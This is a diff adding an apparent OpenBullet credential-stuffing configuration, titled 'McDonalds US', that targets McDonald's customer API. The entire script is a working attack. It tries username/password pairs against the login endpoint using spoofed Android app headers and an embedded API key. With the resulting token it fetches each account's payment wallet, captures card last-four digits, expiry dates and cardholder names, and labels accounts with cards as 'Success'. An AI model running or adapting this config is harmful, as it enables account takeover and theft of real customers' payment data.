@@ -1,0 +1,73 @@
+[SETTINGS]
+{
+  "Name": "McDonalds US",
+  "SuggestedBots": 1,
+  "LastModified": "2018-12-28T02:50:41.4812131+01:00",
+  "AdditionalInfo": "",
+  "Author": "FreakShock",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://api.mcd.com/v2/customer/security/authentication?type=traditional" AutoRedirect=TRUE 
+  CONTENT "{\"password\":\"<PASS>\",\"type\":\"email\",\"loginUsername\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G9350 Build/LMY48Z)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "mcd-sourceapp: MOT" 
+  HEADER "mcd-marketid: US" 
+  HEADER "MarketId: US.PROD5" 
+  HEADER "mcd-locale: en-US" 
+  HEADER "mcd-apiuid: 644e1dd7-2a7f-18fb-b8ed-ed78c3f92c2b" 
+  HEADER "mcd_apikey: USDCUSANDPROD9223064KRNCO38D5IU8D235XXUS" 
+  HEADER "Host: api.mcd.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "X-NewRelic-ID: UwUDUVNVGwIEVVJSBggO" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "status\": \"error" 
+PARSE "<SOURCE>" LR "token\": \"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+REQUEST GET "https://api.mcd.com/v3/customer/payment/wallet" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; Z982 Build/LMY48Z)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "mcd-sourceapp: MOT" 
+  HEADER "mcd-marketid: US" 
+  HEADER "MarketId: US.PROD5" 
+  HEADER "mcd-locale: en-US" 
+  HEADER "mcd-apiuid: 644e1dd7-2a7f-18fb-b8ed-ed78c3f92c2b" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "mcd_apikey: USDCUSANDPROD9223064KRNCO38D5IU8D235XXUS" 
+  HEADER "Host: api.mcd.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "X-NewRelic-ID: UwUDUVNVGwIEVVJSBggO" 
+PARSE "<SOURCE>" LR "CardAlias\":\"" "\"" Recursive=FALSE -> CAP "Last4Digit" "" "" 
+PARSE "<SOURCE>" LR "CardExpiration\":\"" "\"" Recursive=FALSE -> CAP "Exp" "" "" 
+PARSE "<SOURCE>" LR "CardHolderName\":\"" "\"" Recursive=FALSE -> CAP "CardHolderName" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "PaymentCard\":[],\"" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "PaymentCard\":[],\"" 
+  KEYCHAIN Ban OR 
+    KEY "<HEADERS{*}>" Contains "Forbidden" 
+    KEY "<HEADERS{*}>" Contains "Too Many Requests" 
